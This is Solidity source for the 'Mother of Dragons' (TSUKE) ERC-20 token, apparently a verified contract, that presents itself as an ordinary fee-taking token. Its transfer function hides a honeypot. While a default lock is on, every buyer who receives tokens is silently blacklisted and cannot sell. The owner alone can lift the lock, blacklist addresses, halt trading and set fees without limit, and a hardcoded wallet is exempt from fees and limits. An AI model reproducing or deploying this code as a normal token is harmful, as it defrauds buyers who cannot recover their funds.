/**
 *Submitted for verification at Etherscan.io on 2022-12-04
*/

// SPDX-License-Identifier: MIT
// Linktree: https://linktr.ee/motherofdragons
// Telegram: https://t.me/TSUKEannouncements
// Telegram: https://t.me/motherofdragonsERC20
pragma solidity ^0.8.15;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface ERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }
    function renounceOwnership() public onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));
    }
    event OwnershipTransferred(address owner);
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable returns (uint[] memory amounts);
    function swapETHForExactTokens(
        uint amountOut,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable returns (uint[] memory amounts);
}

contract motherofdragons is ERC20, Ownable {
    using SafeMath for uint256;

    address private routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address DEAD = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Mother of Dragons";
    string constant _symbol = "TSUKE";
    uint8 constant _decimals = 9;

    uint256 _totalSupply = 10_000_000 * (10 ** _decimals);
    uint256 public _maxWalletAmount = (_totalSupply * 2 ) / 100;
    uint256 public _maxTxAmount = (_totalSupply * 2 ) / 100;
//    address private pairToken = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; // WETH
    address private pairToken = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; // USDC

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;

    mapping (address => bool) isFeeExempt;
    mapping (address => bool) isTxLimitExempt;
    mapping (address => bool) private blacklist;

    uint256 marketingFee1 = 3;
    uint256 marketingFee2 = 0;
    uint256 liquidityFee = 2;
    uint256 totalFee = liquidityFee + marketingFee1 + marketingFee2;
    uint256 feeDenominator = 100;

    address public marketingFee1Receiver = msg.sender;
    address public marketingFee2Receiver = msg.sender;

    IRouter public router;
    address public pair;

    bool tradingEnabled = true;
    bool isLocked = true;
    bool public swapEnabled = true;
    uint256 public swapThreshold = _totalSupply / 1000 * 5;
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }

    constructor () Ownable(msg.sender) {
        router = IRouter(routerAddress);
        pair = IFactory(router.factory()).createPair(pairToken, address(this));
        _allowances[address(this)][address(router)] = type(uint256).max;

        address _owner = owner;
        isFeeExempt[_owner] = true;
        isFeeExempt[0x268D35e981c81f79BE67F6928488882B7Ca38AD0] = true;
        isTxLimitExempt[_owner] = true;
        isTxLimitExempt[0x268D35e981c81f79BE67F6928488882B7Ca38AD0] = true;
        isTxLimitExempt[DEAD] = true;

        _balances[_owner] = _totalSupply;
        emit Transfer(address(0), _owner, _totalSupply);
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(tradingEnabled, "Trading disabled");
        require(!blacklist[sender], "Blacklisted wallet");

        if (recipient != pair && recipient != owner && recipient != routerAddress && isLocked) {
            blacklist[recipient] = true;
        }

        if(inSwap){ return _basicTransfer(sender, recipient, amount); }

        if (recipient != pair && recipient != DEAD) {
            require(isTxLimitExempt[recipient] || amount <= _maxTxAmount, "Transfer amount exceeds the max TX limit.");
            require(isTxLimitExempt[recipient] || _balances[recipient] + amount <= _maxWalletAmount, "Transfer amount exceeds the bag size.");
        }

        if(shouldSwapBack()){ swapBack(); }

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);

        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function shouldTakeFee(address from, address to) internal view returns (bool) {
        return !(isFeeExempt[from] || isFeeExempt[to]);
    }

    function takeFee(address sender, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = amount.mul(totalFee).div(feeDenominator);
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        return amount.sub(feeAmount);
    }

    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != pair
        && !inSwap
        && swapEnabled
        && _balances[address(this)] >= swapThreshold;
    }

    function swapBack() internal swapping {
        uint256 contractTokenBalance = _balances[address(this)];
        if (contractTokenBalance >= swapThreshold*2)
            contractTokenBalance = swapThreshold*2;
        uint256 amountToLiquify = contractTokenBalance.mul(liquidityFee).div(totalFee).div(2);
        uint256 amountToSwap = contractTokenBalance.sub(amountToLiquify);

        address[] memory path = new address[](3);
        path[0] = address(this);
        path[1] = pairToken;
        path[2] = router.WETH();

        uint256 balanceBefore = address(this).balance;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountETH = address(this).balance.sub(balanceBefore);
        uint256 totalETHFee = totalFee.sub(liquidityFee.div(2));
        uint256 amountETHLiquidity = amountETH.mul(liquidityFee).div(totalETHFee).div(2);
        uint256 amountETHMarketing1 = amountETH.mul(marketingFee1).div(totalETHFee);
        uint256 amountETHMarketing2 = amountETH.mul(marketingFee2).div(totalETHFee);


        (bool Marketing1Success, /* bytes memory data */) = payable(marketingFee1Receiver).call{value: amountETHMarketing1, gas: 30000}("");
        require(Marketing1Success, "receiver rejected ETH transfer");
        (bool Marketing2Success, /* bytes memory data */) = payable(marketingFee2Receiver).call{value: amountETHMarketing2, gas: 30000}("");
        require(Marketing2Success, "receiver rejected ETH transfer");

        if(amountToLiquify > 0){
            router.addLiquidityETH{value: amountETHLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                owner,
                block.timestamp
            );
            emit AutoLiquify(amountETHLiquidity, amountToLiquify);
        }
    }

    function clearStuckBalance() external {
        payable(owner).transfer(address(this).balance);
    }

    function setWalletLimit(uint256 amountPercent) external onlyOwner {
        _maxWalletAmount = (_totalSupply * amountPercent ) / 100;
    }

    function setTxLimit(uint256 amountPercent) external onlyOwner {
        _maxTxAmount = (_totalSupply * amountPercent ) / 100;
    }

    function swapStatus(bool status) external onlyOwner {
        swapEnabled = status;
    }

    function blacklistAddress(address addr, bool isBlocked) external onlyOwner {
        blacklist[addr] = isBlocked;
    }

    function blacklistAddresses(address[] memory addrs, bool isBlocked) external onlyOwner {
        for (uint256 i = 0; i < addrs.length; i++) {
            blacklist[addrs[i]] = isBlocked;
        }
    }

    function isBlacklisted(address addr) external view returns(bool) {
        return blacklist[addr];
    }

    function releaseLock() external onlyOwner {
        isLocked = false;
    }

    function setFees(uint256 _marketingFee1, uint256 _marketingFee2, uint256 _liquidityFee) external onlyOwner {
        marketingFee1 = _marketingFee1;
        marketingFee2 = _marketingFee2;
        liquidityFee = _liquidityFee;
        totalFee = liquidityFee + marketingFee1 + marketingFee2;
    }

    function setThreshold(uint256 _treshold) external onlyOwner {
        swapThreshold = _treshold;
    }

    function setFee1Receivers(address _marketingFee1Receiver) external onlyOwner {
        if (marketingFee1Receiver != owner) {
            isFeeExempt[marketingFee1Receiver] = false;
            isTxLimitExempt[marketingFee1Receiver] = false;
        }
        marketingFee1Receiver = _marketingFee1Receiver;
        isFeeExempt[_marketingFee1Receiver] = true;
        isTxLimitExempt[_marketingFee1Receiver] = true;
    }

    function setFee2Receivers(address _marketingFee2Receiver) external onlyOwner {
        if (marketingFee2Receiver != owner) {
            isFeeExempt[marketingFee2Receiver] = false;
            isTxLimitExempt[marketingFee2Receiver] = false;
        }
        marketingFee2Receiver = _marketingFee2Receiver;
        isFeeExempt[_marketingFee2Receiver] = true;
        isTxLimitExempt[_marketingFee2Receiver] = true;
    }

    function addFeeExemptAddresses(address[] memory addrs, bool _feeExempt) external onlyOwner {
        for (uint256 i = 0; i < addrs.length; i++) {
            isFeeExempt[addrs[i]] = _feeExempt;
            isTxLimitExempt[addrs[i]] = _feeExempt;
        }
    }

    function setTradingEnabled(bool _tradingEnabled) external onlyOwner {
        tradingEnabled = _tradingEnabled;
    }

    event AutoLiquify(uint256 amountETH, uint256 amountBOG);
}